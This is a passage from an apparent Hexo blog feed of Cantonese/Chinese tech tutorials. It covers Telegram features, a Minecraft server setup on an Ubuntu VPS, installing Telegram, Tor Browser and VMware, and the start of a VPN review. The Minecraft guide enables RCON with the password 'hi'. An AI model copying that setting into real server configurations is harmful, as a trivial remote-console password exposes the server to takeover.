<h2 id="5-Themes-主題"><a href="#5-Themes-主題" class="headerlink" title="5. Themes (主題)"></a>5. Themes (主題)</h2><p>黑夜主題，明亮主題這些不用說了吧，<br>但是 Telegram 也有其他 Themes，<br>你也可以自訂自己的顏色，<br>又可以將背景 Blur。</p>
<h2 id="6-Emoji"><a href="#6-Emoji" class="headerlink" title="6. Emoji"></a>6. Emoji</h2><p>在 Telegram 中，<br>他有自己特有的圖案，<br>也有放大的圖案，<br>我們平常使用的 emoji，<br>在 Telegram 中是有放大版本的，(Large Emoji)<br>你案下去的時候也會有反應。</p>
<h2 id="7-Telegram-Bot"><a href="#7-Telegram-Bot" class="headerlink" title="7. Telegram Bot"></a>7. Telegram Bot</h2><p>Telegram 也提供官方 API 給大家，<br>建立一個機械人使用起來更加方便，<br>只要你會編程，<br>你也能創建自己的 Bot，<br>例如 Youtube 音樂下載器。</p>
<h1 id="支援系統"><a href="#支援系統" class="headerlink" title="支援系統"></a>支援系統</h1><ul>
<li>Linux</li>
<li>Mac</li>
<li>Windows</li>
<li>IOS</li>
<li>Android</li>
</ul>
]]></content>
      <categories>
        <category>匿名</category>
      </categories>
      <tags>
        <tag>程式</tag>
      </tags>
  </entry>
  <entry>
    <title>網頁版俄羅斯方塊網站</title>
    <url>/2022/02/22/Tetris-web/</url>
    <content><![CDATA[<img src="c.png" width="200px"/>


<h1 id="俄羅斯方塊"><a href="#俄羅斯方塊" class="headerlink" title="俄羅斯方塊"></a>俄羅斯方塊</h1><p>【遊戲名稱】：俄羅斯方塊<br>【遊戲版本】：網頁版<br>【遊戲語言】：英文<br>【遊戲網站】：<a href="https://tetris.com/sanrio">按這裡</a></p>
<h1 id="遊戲畫面"><a href="#遊戲畫面" class="headerlink" title="遊戲畫面"></a>遊戲畫面</h1><img src="/2022/02/22/Tetris-web/vii.png" class="">]]></content>
      <categories>
        <category>俄羅斯方塊</category>
      </categories>
      <tags>
        <tag>Games</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu VPS Server - 建立 Minecraft 伺服器並廿四小時開放不停止</title>
    <url>/2022/07/09/Ubuntu-20-04-LTS-VPS-create-a-minecraft-24hr-open/</url>
    <content><![CDATA[<img src="cover.png" width="200px"/>

<h1 id="開啟伺服器需求"><a href="#開啟伺服器需求" class="headerlink" title="開啟伺服器需求"></a>開啟伺服器需求</h1><p>如要開啟伺服器，必須開放目前主機的 IP 位置並且開放一個 Port 位置讓其他人可以進入到你的伺服器。<br>本篇文章會使用以下的工具開啟 Minecraft 伺服器 ~</p>
<ul>
<li>VPS Server - 2RAM 的配置 (最小要用 2RAM)</li>
<li>SSH - 連接伺服器工具 (必要)</li>
<li>Filezilla - Gui 工具放置檔案用 (可選)</li>
<li>SCP - 指令放置檔案用 (可選)</li>
<li>Java Edition server - Mincecraft 必須要用 (必要)</li>
<li>Screen - 後台運行伺服器程式 (必要)</li>
</ul>
<p>如果不懂如果建立 VPS Server，可以參考我這篇使用 Digitalocean 建立的文章：<a href="/2022/07/10/Digitalocean-create-droplets-cloud-server-vps/">Digitalocean - 建立 Droplets VPS Server</a></p>
<h1 id="第一步-安裝-SSH-連接工具"><a href="#第一步-安裝-SSH-連接工具" class="headerlink" title="第一步 - 安裝 SSH 連接工具"></a>第一步 - 安裝 SSH 連接工具</h1><p>請先創建一部 VPS Server，不懂的人可以看看上面的文章。</p>
<p>接下來我們需要登入這部伺服器並在內進行安裝程式，修改檔案，設定防火牆等等。</p>
<ul>
<li>Windows 10/11 系統原本已經預設有 SSH 連接工具，</li>
<li>Linux 系統大部分都已經預設有 SSH 連接工具。</li>
</ul>
<p>如果沒有的話輸入以下指令安裝 ~</p>
<p>Debian :</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install ssh -y</span><br></pre></td></tr></table></figure>

<p>Arch :</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pacman -S ssh</span><br></pre></td></tr></table></figure>

<p>Fedora :</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo dnf install ssh</span><br></pre></td></tr></table></figure>

<h2 id="第二步-登入-SSH-伺服器"><a href="#第二步-登入-SSH-伺服器" class="headerlink" title="第二步 - 登入 SSH 伺服器"></a>第二步 - 登入 SSH 伺服器</h2><p>到剛剛看到的 VPS Server IP 位置，將看到的 IP 複製，然後開啟你的終端機輸入以下指令：</p>
<div class="note info flat">
    留意：他會問你是否信任來源，輸入 <code>yes</code> 繼續。
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh root@your_server_Ip</span><br></pre></td></tr></table></figure>

<p><img src="connect-1.gif"></p>
<h1 id="第三步-Accept-Port-22"><a href="#第三步-Accept-Port-22" class="headerlink" title="第三步 - Accept Port 22"></a>第三步 - Accept Port 22</h1><p>因應建立伺服器後，視乎是使用那一間公司提供 VPS 租用的服務，以 DigitalOcean 為例，他預設是會幫你將 port 22 拒絕，只能登入一次，日後就再無法使用 shell 登入伺服器。<br>所以，為了防止這個不能登入的尷尬情況發生，我們需要於建立伺服器後第一步就要將 VPS 的 22 Port 修改為 Accept。<br>輸入以下指令改變為 Accept：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT</span><br></pre></td></tr></table></figure>

<h1 id="第四步-更新套裝管理員"><a href="#第四步-更新套裝管理員" class="headerlink" title="第四步 - 更新套裝管理員"></a>第四步 - 更新套裝管理員</h1><p>安裝之前，我們需要將新的系統的套裝管理員更新，輸入以下指令更新：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update -y</span><br></pre></td></tr></table></figure>

<p><img src="connect-2.png"></p>
<h2 id="第五步-安裝-Java-JDK"><a href="#第五步-安裝-Java-JDK" class="headerlink" title="第五步 - 安裝 Java JDK"></a>第五步 - 安裝 Java JDK</h2><p>接下來，安裝 Java 的 OpenJDK 版本 17 (JRE)，這是 Java 的最小版本，它刪除了對 GUI 應用程序的支持，所以在 VPS 上運行是非常適合，去除沒必要的檔案大小 ~</p>
<p>另外，OpenJDK 版本 17 是支援 Minecraft 最新版本的 1.19 ~~</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install openjdk-17-jre-headless -y</span><br></pre></td></tr></table></figure>

<p><img src="connect-3.png"></p>
<h2 id="第六步-安裝-Screen"><a href="#第六步-安裝-Screen" class="headerlink" title="第六步 - 安裝 Screen"></a>第六步 - 安裝 Screen</h2><p>這工具會使你可以在後台運行伺服器，應該是叫做分離視窗，即使你將視窗關閉也不影響你伺服器的運行。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install screen -y</span><br></pre></td></tr></table></figure>

<p><img src="connect-4.png"></p>
<h2 id="第七步-下載最新版本-Minecraft-伺服器檔案"><a href="#第七步-下載最新版本-Minecraft-伺服器檔案" class="headerlink" title="第七步 - 下載最新版本 Minecraft 伺服器檔案"></a>第七步 - 下載最新版本 Minecraft 伺服器檔案</h2><p>現在你需要下載目前最新版本的 Minecraft 服務器，直接進到 <a href="https://www.minecraft.net/en-us/download/server">Minecraft</a> 的網站並複製連結 minecraft_server.X.X.X.jar</p>
<p>或者使用 <code>wget</code> 將檔案下載：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://launcher.mojang.com/v1/objects/e00c4052dac1d59a1188b2aa9d5a87113aaf1122/server.jar</span><br></pre></td></tr></table></figure>

<p><img src="connect-5-wget.png"></p>
<h1 id="第八步-設定-Firewall"><a href="#第八步-設定-Firewall" class="headerlink" title="第八步 - 設定 Firewall"></a>第八步 - 設定 Firewall</h1><p>我會使用 ufw 設置 firewall，ufw 預設是關閉狀態，所以我們需要將他啟動：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ufw enable</span><br></pre></td></tr></table></figure>
<p><img src="ufw-1.png"></p>
<h2 id="第九步-OpenPort-25565"><a href="#第九步-OpenPort-25565" class="headerlink" title="第九步 - OpenPort 25565"></a>第九步 - OpenPort 25565</h2><p>開啟這部伺服器的 25565 端口，讓其他人可以進入你的伺服器：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ufw allow 25565</span><br></pre></td></tr></table></figure>

<p><img src="ufw-2.png"></p>
<h1 id="第十步-啟動伺服器"><a href="#第十步-啟動伺服器" class="headerlink" title="第十步 - 啟動伺服器"></a>第十步 - 啟動伺服器</h1><p>輸入以下指令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -Xms1024M -Xmx1024M -jar server.jar nogui</span><br></pre></td></tr></table></figure>

<ul>
<li><p>Xms1024M - 伺服器配置會以 1024MB 或 1GB 的 RAM 開始運行，如果您希望伺服器以更多 RAM 啟動，可以提高數字。<br>M 代表兆字節，G 代表千兆字節都是受支持的選項。</p>
</li>
<li><p>Xmx1024M - 這會將伺服器配置為最多使用 1024M 的 RAM，如果您希望伺服器以更大的 RAM 運行，允許更多玩家，或者如果您覺得服務器運行緩慢，您可以提高此限制。</p>
</li>
<li><p>jar - 此標誌指定要運行的服務器 jar 文件。</p>
</li>
<li><p>nogui - 這告訴伺服器不要啟動 GUI，因為這是一個 VPS 伺服器，而且你沒有圖形用戶界面 (gui)。</p>
</li>
</ul>
<p><img src="start-server.gif"></p>
<h2 id="第十一步-伺服器錯誤"><a href="#第十一步-伺服器錯誤" class="headerlink" title="第十一步 - 伺服器錯誤"></a>第十一步 - 伺服器錯誤</h2><p>第一次運行後會出現以下的錯誤，不用擔心，這是正常的，因為你沒有啟用到兩個重要的文件，載入一次後生產相應的文件我們再作修改。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Starting net.minecraft.server.Main</span><br><span class="line">[14:01:39] [ServerMain/INFO]: Building unoptimized datafixer</span><br><span class="line">[14:01:42] [ServerMain/ERROR]: Failed to load properties from file: server.properties</span><br><span class="line">[14:01:42] [ServerMain/WARN]: Failed to load eula.txt</span><br><span class="line">[14:01:42] [ServerMain/INFO]: You need to agree to the EULA in order to run the server. Go to eula.txt for more info.</span><br></pre></td></tr></table></figure>

<p><img src="fix.png"></p>
<h1 id="第十二步-修改-eula-txt-檔案"><a href="#第十二步-修改-eula-txt-檔案" class="headerlink" title="第十二步 - 修改 eula.txt 檔案"></a>第十二步 - 修改 eula.txt 檔案</h1><p>現在我們需要修改以下兩個檔案：</p>
<ul>
<li>eula.txt - EULA (End User License Agreement)</li>
</ul>
<p><img src="eula.png"></p>
<p>修改 <code>eula.txt</code> 內容，我會使用 <code>nano</code> 進行修改，將原本內容的 <code>eula=false</code> 改為 <code>eula=true</code>，然後再儲存檔案。</p>
<div class="note info flat">
    nano 教學：<kbd>Ctrl</kbd>+<kbd>S</kbd> 儲存，然後 <kbd>Ctrl</kbd>+<kbd>X</kbd> 是退出。
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nano eula.txt</span><br></pre></td></tr></table></figure>

<p><img src="nano-1.png"></p>
<p>完成之後，輸入以下指令列出檔案內容確定是否已經修改成功：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat eula.txt</span><br></pre></td></tr></table></figure>

<p><img src="cat-1.png"></p>
<h1 id="第十三步-修改-server-properties-檔案"><a href="#第十三步-修改-server-properties-檔案" class="headerlink" title="第十三步 - 修改 server.properties 檔案"></a>第十三步 - 修改 server.properties 檔案</h1><p>現在，我們看看 <code>server.properties</code> 檔案的內容，這個檔案會包含你伺服器的一些 config，例如 伺服器名稱, 伺服器 IP 位置, PVP 模式開關, 模式。</p>
<p>尋找以下三樣東西，像以下這樣子，確定已經更改為你想要的內容後，儲存檔案後退出。</p>
<ul>
<li><p>rcon.port=25575</p>
</li>
<li><p>rcon.password=hi</p>
</li>
<li><p>enable-rcon=true</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">Minecraft server properties</span></span><br><span class="line"><span class="meta">#</span><span class="bash">Sat Jul 09 14:01:42 UTC 2022</span></span><br><span class="line">enable-jmx-monitoring=false</span><br><span class="line">rcon.port=25575</span><br><span class="line">level-seed=</span><br><span class="line">gamemode=survival</span><br><span class="line">enable-command-block=false</span><br><span class="line">enable-query=false</span><br><span class="line">generator-settings=&#123;&#125;</span><br><span class="line">enforce-secure-profile=false</span><br><span class="line">level-name=world</span><br><span class="line">motd=A Minecraft Server</span><br><span class="line">query.port=25565</span><br><span class="line">pvp=true</span><br><span class="line">generate-structures=true</span><br><span class="line">max-chained-neighbor-updates=1000000</span><br><span class="line">difficulty=easy</span><br><span class="line">network-compression-threshold=256</span><br><span class="line">max-tick-time=60000</span><br><span class="line">require-resource-pack=false</span><br><span class="line">use-native-transport=true</span><br><span class="line">max-players=20</span><br><span class="line">online-mode=true</span><br><span class="line">enable-status=true</span><br><span class="line">allow-flight=false</span><br><span class="line">broadcast-rcon-to-ops=true</span><br><span class="line">view-distance=10</span><br><span class="line">server-ip=</span><br><span class="line">resource-pack-prompt=</span><br><span class="line">allow-nether=true</span><br><span class="line">server-port=25565</span><br><span class="line">enable-rcon=true</span><br><span class="line">sync-chunk-writes=true</span><br><span class="line">op-permission-level=4</span><br><span class="line">prevent-proxy-connections=false</span><br><span class="line">hide-online-players=false</span><br><span class="line">resource-pack=</span><br><span class="line">entity-broadcast-range-percentage=100</span><br><span class="line">simulation-distance=10</span><br><span class="line">rcon.password=hi</span><br><span class="line">player-idle-timeout=0</span><br><span class="line">force-gamemode=false</span><br><span class="line">rate-limit=0</span><br></pre></td></tr></table></figure>

<h1 id="最後一步-使用-Screen-保持伺服器運行中"><a href="#最後一步-使用-Screen-保持伺服器運行中" class="headerlink" title="最後一步 - 使用 Screen 保持伺服器運行中"></a>最後一步 - 使用 Screen 保持伺服器運行中</h1><p>首先輸入 <code>screen</code>，然後按鍵盤的 <code>空白鍵</code> 後再輸入以下指令 ~</p>
<p>載入時間會比較長，請耐心等候。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -Xms1024M -Xmx2048M -jar server.jar nogui</span><br></pre></td></tr></table></figure>

<p><img src="done-2.png"></p>
<p><img src="finally.gif"></p>
<p><img src="okla.gif"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[15:49:16] [Server thread/INFO]: Time elapsed: 31957 ms</span><br><span class="line">[15:49:17] [Server thread/INFO]: Done (61.939s)! For help, type &quot;help&quot;</span><br><span class="line">[15:49:17] [Server thread/INFO]: Starting remote control listener</span><br><span class="line">[15:49:17] [Server thread/INFO]: Thread RCON Listener started</span><br><span class="line">[15:49:17] [Server thread/INFO]: RCON running on your_server_ip:port</span><br></pre></td></tr></table></figure>

<p>當你看到列出以上內容後，就代表已經成功啟動伺服器 ~</p>
<p>如果想退出目前視窗至後台的話請按鍵盤 <kbd>Ctrl</kbd>+<kbd>A</kbd>+<kbd>D</kbd> 退出。</p>
<p><img src="ad.png"></p>
<h1 id="最終步驟-開啟-Minecraft進入伺服器"><a href="#最終步驟-開啟-Minecraft進入伺服器" class="headerlink" title="最終步驟 - 開啟 Minecraft進入伺服器"></a>最終步驟 - 開啟 Minecraft進入伺服器</h1><p>開啟後點擊 <code>多人遊戲</code>。</p>
<p><img src="2022-07-10_00.25.25.gif"></p>
<p>點擊右下方 <code>新增伺服器</code></p>
<p><img src="2022-07-10_00.25.31.gif"></p>
<p>輸入 IP 位置後點擊 <code>完成</code></p>
<p><img src="2022-07-10_00.25.46.gif"></p>
<p>點擊你的伺服器後點擊 <code>加入伺服器</code>，然後就會進入伺服器其後再 <code>載入地圖中 ...</code></p>
<p><img src="loading.gif"></p>
<p>載入完成 ~ 成功進入伺服器 ~</p>
<p><img src="2022-07-10_00.26.27.gif"></p>
<h1 id="後記-篇文寫左八個鐘"><a href="#後記-篇文寫左八個鐘" class="headerlink" title="後記 - 篇文寫左八個鐘"></a>後記 - 篇文寫左八個鐘</h1><p>筆者我本身係個唔玩 Minecraft 既人，係上個月先開始接觸，之前係有開過 CS1.6 Server，諗住大同小異啦，點知寫今篇文個陣遇到好多問題，個問題重點都係因為唔夠 RAM 先行唔到，我由一開始用緊 512mb 行，發現係唔得，咁查下發現原來係唔夠 RAM，之後我再試埋將個 RAM 升到去 1GB，都係唔得，但係至小個 error 小左，但行到去最後個 Step 之後，又出 Error，最後我用左 2GB RAM 終於冇再出 Error …</p>
<p>講返轉頭 Minecraft 真係好撚高需求 … 冇乜錢真係唔好用 VPS 黎開，計返港錢既話要成 $84HKD 一個月，真係搵返啲轉用黎開 Game Server 既 Serivce 開 server 啦 =.= …</p>
<p><img src="CLSSS.png"></p>
<h1 id="參考資料"><a href="#參考資料" class="headerlink" title="參考資料"></a>參考資料</h1><p><a href="https://www.shells.com/l/en-US/tutorial/0-A-Guide-to-Installing-a-Minecraft-Server-on-Linux-Ubuntu">https://www.shells.com/l/en-US/tutorial/0-A-Guide-to-Installing-a-Minecraft-Server-on-Linux-Ubuntu</a><br><a href="https://www.digitalocean.com/community/tutorials/how-to-create-a-minecraft-server-on-ubuntu-20-04">https://www.digitalocean.com/community/tutorials/how-to-create-a-minecraft-server-on-ubuntu-20-04</a><br><a href="https://gaming.stackexchange.com/questions/198779/ubuntu-minecraft-server-says-eula-isnt-true-but-is">https://gaming.stackexchange.com/questions/198779/ubuntu-minecraft-server-says-eula-isnt-true-but-is</a><br><a href="https://www.youtube.com/watch?v=3Z46DxQbAK0">https://www.youtube.com/watch?v=3Z46DxQbAK0</a><br><a href="https://www.reddit.com/r/Minecraft/comments/nv92fg/error_while_launcher_a_117_minecraft_server_fix/">https://www.reddit.com/r/Minecraft/comments/nv92fg/error_while_launcher_a_117_minecraft_server_fix/</a><br><a href="https://help.minecraft.net/hc/en-us/articles/360058525452-How-to-Setup-a-Minecraft-Java-Edition-Server">https://help.minecraft.net/hc/en-us/articles/360058525452-How-to-Setup-a-Minecraft-Java-Edition-Server</a><br><a href="https://minecraft.fandom.com/wiki/Server/Requirements/Dedicated#Unix_(Linux,_BSD,_macOS)">https://minecraft.fandom.com/wiki/Server/Requirements/Dedicated#Unix_(Linux,_BSD,_macOS)</a><br><a href="https://www.shells.com/l/en-US/tutorial/0-A-Guide-to-Installing-a-Minecraft-Server-on-Linux-Ubuntu">https://www.shells.com/l/en-US/tutorial/0-A-Guide-to-Installing-a-Minecraft-Server-on-Linux-Ubuntu</a></p>
<h1 id="檔案下載網站"><a href="#檔案下載網站" class="headerlink" title="檔案下載網站"></a>檔案下載網站</h1><p><a href="https://mcversions.net/">https://mcversions.net/</a><br><a href="https://www.minecraft.net/en-us/download/server">https://www.minecraft.net/en-us/download/server</a></p>
]]></content>
      <categories>
        <category>Minecraft</category>
      </categories>
      <tags>
        <tag>Games</tag>
        <tag>Server</tag>
        <tag>Digitalocean</tag>
        <tag>VPS Server</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu - 安裝 Telegram</title>
    <url>/2022/01/07/Ubuntu-install-telegram/</url>
    <content><![CDATA[<img src="/img/Post/image/Ubuntu/cover.png" width="200px"/>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>喺 Ubunut 安裝 Telegram Desktop 有兩個方法 :</p>
<ul>
<li>PPA</li>
<li>Snap</li>
</ul>
<h1 id="安裝方法-1-ppa"><a href="#安裝方法-1-ppa" class="headerlink" title="安裝方法 1 (ppa)"></a>安裝方法 1 (ppa)</h1><p>加入 ppa list</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository ppa:atareao/telegram</span><br></pre></td></tr></table></figure>

<p>安裝 Telegram</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update &amp;&amp; sudo apt install telegram</span><br></pre></td></tr></table></figure>

<h1 id="安裝方法-2-snap"><a href="#安裝方法-2-snap" class="headerlink" title="安裝方法 2 (snap)"></a>安裝方法 2 (snap)</h1><p>你需要部機本身係有 snap 先得。</p>
<h2 id="安裝-Snap"><a href="#安裝-Snap" class="headerlink" title="安裝 Snap"></a>安裝 Snap</h2><p>我地用 apt install :</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install snap -y</span><br></pre></td></tr></table></figure>

<h2 id="安裝-Snap-Store"><a href="#安裝-Snap-Store" class="headerlink" title="安裝 Snap Store"></a>安裝 Snap Store</h2><p>當你裝好 snap 之後可以選擇裝唔裝 gui 版 Snap，如果你想裝，打埋下面呢句指令裝。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo snap install snap-store -y</span><br></pre></td></tr></table></figure>

<h2 id="開啟-Snap-Store"><a href="#開啟-Snap-Store" class="headerlink" title="開啟 Snap Store"></a>開啟 Snap Store</h2><p>下載完成之後輸入以下指令啟動：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">snap-store</span><br></pre></td></tr></table></figure>

<h2 id="安裝-Telegram"><a href="#安裝-Telegram" class="headerlink" title="安裝 Telegram"></a>安裝 Telegram</h2><p>裝好 snap 可以打下面呢句裝 Telegram Desktop。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo snap install telegram-desktop</span><br></pre></td></tr></table></figure>

<p>參考資料 :<br><a href="https://www.omgubuntu.co.uk/2019/08/how-to-install-telegram-on-ubuntu">https://www.omgubuntu.co.uk/2019/08/how-to-install-telegram-on-ubuntu</a></p>
]]></content>
      <categories>
        <category>Ubuntu</category>
      </categories>
      <tags>
        <tag>安裝</tag>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu - 安裝 TorBrowser</title>
    <url>/2022/01/07/Ubuntu-install-torbrowser/</url>
    <content><![CDATA[<h1 id="ppa-安裝-Torbrowser"><a href="#ppa-安裝-Torbrowser" class="headerlink" title="ppa 安裝 Torbrowser"></a>ppa 安裝 Torbrowser</h1><p>開啟 Terminal <code>ctrl</code> + <code>alt</code> + <code>t</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository ppa:micahflee/ppa</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update &amp;&amp; sudo apt install torbrowser-launcher</span><br></pre></td></tr></table></figure>

<p>As user run the following command:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">torbrowser-launcher</span><br></pre></td></tr></table></figure>

<p>參考資料 :<br><a href="https://linuxize.com/post/how-to-install-tor-browser-on-ubuntu-18-04/">https://linuxize.com/post/how-to-install-tor-browser-on-ubuntu-18-04/</a></p>
]]></content>
      <categories>
        <category>Ubuntu</category>
      </categories>
      <tags>
        <tag>安裝</tag>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>VMware - 安裝虛擬主機軟件 (Windows)</title>
    <url>/2022/06/21/VMWARE-INSTALL-FOR-WINDOWS/</url>
    <content><![CDATA[<img src="/img/Post/image/VMware/vmware_icon.png" width="200px"/>


<h1 id="VMware"><a href="#VMware" class="headerlink" title="VMware"></a>VMware</h1><p>VMware Workstation 於 1999 年推出，是 VMware 推出的第一款產品。<br>該軟件套件允許用戶在單個物理個人計算機上運行 x86 或 x86-64 兼容操作系統的多個實例，並且每個系統內的都會有一個獨立的隔離，不影響實體機。</p>
<p>【程式名稱】：VMware Workstation<br>【下載網站】：<a href="https://customerconnect.vmware.com/en/downloads/details?downloadGroup=WKST-PLAYER-1623-NEW&productId=1039&rPId=85399">按這裡</a><br>【腳本語言】：多國語言</p>
<h1 id="下載-VMware-Workstation-安裝檔"><a href="#下載-VMware-Workstation-安裝檔" class="headerlink" title="下載 VMware Workstation 安裝檔"></a>下載 VMware Workstation 安裝檔</h1><p>按下上方所說明的 <code>下載網站</code> 內下載檔案以 <code>系統管理員身份</code> 將他開啟。</p>
<img src="/2022/06/21/VMWARE-INSTALL-FOR-WINDOWS/download.png" class="">

<h1 id="開啟檔案"><a href="#開啟檔案" class="headerlink" title="開啟檔案"></a>開啟檔案</h1><hr>
<h2 id="VMware-Setup-Wizard"><a href="#VMware-Setup-Wizard" class="headerlink" title="VMware Setup Wizard"></a>VMware Setup Wizard</h2><p>按 <code>Next</code>。</p>
<img src="/2022/06/21/VMWARE-INSTALL-FOR-WINDOWS/1.png" class="">

<h2 id="License-Agreement"><a href="#License-Agreement" class="headerlink" title="License Agreement"></a>License Agreement</h2><p>將 <code>i accept the terms in the License Agreement</code> Tick，然後按下 <code>Next</code>。</p>
<img src="/2022/06/21/VMWARE-INSTALL-FOR-WINDOWS/2.png" class="">

<h2 id="Custom-Setup"><a href="#Custom-Setup" class="headerlink" title="Custom Setup"></a>Custom Setup</h2><p>路徑如果不改變就直接按下 <code>Next</code> 進入下一步操作。</p>
<img src="/2022/06/21/VMWARE-INSTALL-FOR-WINDOWS/3.png" class="">

<h2 id="Settings"><a href="#Settings" class="headerlink" title="Settings"></a>Settings</h2><ul>
<li><input disabled="" type="checkbox"> Check for product updates on startup // 意思是每當電腦啟動的時候會檢查軟件更新。</li>
<li><input disabled="" type="checkbox"> Join the VMware Customer Experience Improvement Program // 意思是加入 VMware 客戶體驗改善計劃</li>
</ul>
<div class="note warning flat">
我不想電腦每次啟動也加載程式，這裡會令電腦慢慢變慢。</br>
我不想加入 <code>客戶體驗改善計劃</code> 這樣會沒有私隱。</br>
所以我兩者也會取消 Tick。
</div>

<p>我兩種也不需要，所以將兩種去除 Tick，然後下一步 <code>Next</code>。</p>
<img src="/2022/06/21/VMWARE-INSTALL-FOR-WINDOWS/4.png" class="">

<h2 id="Shortcuts"><a href="#Shortcuts" class="headerlink" title="Shortcuts"></a>Shortcuts</h2><p>我只需要 <code>Desktop</code> 的桌面連結。</p>
<img src="/2022/06/21/VMWARE-INSTALL-FOR-WINDOWS/5.png" class="">

<h2 id="準備安裝"><a href="#準備安裝" class="headerlink" title="準備安裝"></a>準備安裝</h2><p>確定以上的設置後，按下 <code>Install</code> 開始真正安裝 VMware。</p>
<img src="/2022/06/21/VMWARE-INSTALL-FOR-WINDOWS/6.png" class="">

<h2 id="安裝中-…"><a href="#安裝中-…" class="headerlink" title="安裝中 …"></a>安裝中 …</h2><img src="/2022/06/21/VMWARE-INSTALL-FOR-WINDOWS/7.png" class="">
<img src="/2022/06/21/VMWARE-INSTALL-FOR-WINDOWS/8.png" class="">

<h2 id="安裝完成"><a href="#安裝完成" class="headerlink" title="安裝完成"></a>安裝完成</h2><p>安裝完成，按下 <code>Finish</code>。</p>
<img src="/2022/06/21/VMWARE-INSTALL-FOR-WINDOWS/9.png" class="">


<h1 id="啟動-VMware-Player"><a href="#啟動-VMware-Player" class="headerlink" title="啟動 VMware Player"></a>啟動 VMware Player</h1><p>直接在右下角尋找 <code>vmware</code>。</p>
<img src="/2022/06/21/VMWARE-INSTALL-FOR-WINDOWS/hi.png" class="">

<h2 id="License-輸入？"><a href="#License-輸入？" class="headerlink" title="License 輸入？"></a>License 輸入？</h2><p>由於我沒有購買，只是免費使用，所以直接按 <code>Continue</code>。</p>
<img src="/2022/06/21/VMWARE-INSTALL-FOR-WINDOWS/yo.png" class="">

<h2 id="確定完成"><a href="#確定完成" class="headerlink" title="確定完成"></a>確定完成</h2><img src="/2022/06/21/VMWARE-INSTALL-FOR-WINDOWS/f.png" class="">

<h2 id="啟動成功"><a href="#啟動成功" class="headerlink" title="啟動成功"></a>啟動成功</h2><img src="/2022/06/21/VMWARE-INSTALL-FOR-WINDOWS/done.png" class="">]]></content>
      <categories>
        <category>VMware</category>
      </categories>
  </entry>
  <entry>
    <title>VMware - Keyborad Shortcuts</title>
    <url>/2022/01/28/VMware-Keyborad-Shortcuts/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>用 VMware 如果下下都要慢慢搵粒制，做野既效率會慢好多。<br>相反，用鍵盤取代撳制黎操作，效率會快幾倍。</p>
<p>如果要講，我本人建議兩邊都要學識點用，咁先至係熟悉用既高手。</p>
<h2 id="Exit-Virtual-Machine-control"><a href="#Exit-Virtual-Machine-control" class="headerlink" title="Exit Virtual Machine control"></a>Exit Virtual Machine control</h2><blockquote>
<p><kbd>Ctrl</kbd>+<kbd>ALT</kbd></p>
</blockquote>
<h2 id="Send-Ctrl-Alt-Del"><a href="#Send-Ctrl-Alt-Del" class="headerlink" title="Send Ctrl + Alt + Del"></a>Send Ctrl + Alt + Del</h2><blockquote>
<p><kbd>Ctrl</kbd>+<kbd>Alt</kbd>+<kbd>Insert</kbd></p>
</blockquote>
<p>Detail<br><a href="https://gist.github.com/datacodesolutions/3730430">https://gist.github.com/datacodesolutions/3730430</a><br><a href="https://gist.github.com/cemerson/9616792">https://gist.github.com/cemerson/9616792</a></p>
]]></content>
      <categories>
        <category>VMware</category>
      </categories>
      <tags>
        <tag>Shortcuts</tag>
      </tags>
  </entry>
  <entry>
    <title>2022 年 - VPN 評價</title>
    <url>/2022/02/08/VPN-List/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>以下為站長的評分，評分準則為以下 :</p>
<ul>
<li>私隱安全</li>
<li>速度</li>
<li>隱定</li>
<li>安全</li>
</ul>
<h2 id="1-SurfShark-VPN"><a href="#1-SurfShark-VPN" class="headerlink" title="1. SurfShark VPN"></a>1. <a href="https://surfshark.com/">SurfShark VPN</a></h2><img src="surfshark.png" />

<p>推薦: 自從知道佢同 Nord 有路開始，唔敢講啦。<br>安全: 自從知道佢同 Nord 有路開始，唔敢講啦。<br>速度: ⭐⭐⭐<br>隱定: ⭐⭐</p>
<p>Q: 我有冇用過？<br>A: 有</p>
<p>Q: 用左幾耐？<br>A: 兩年幾</p>
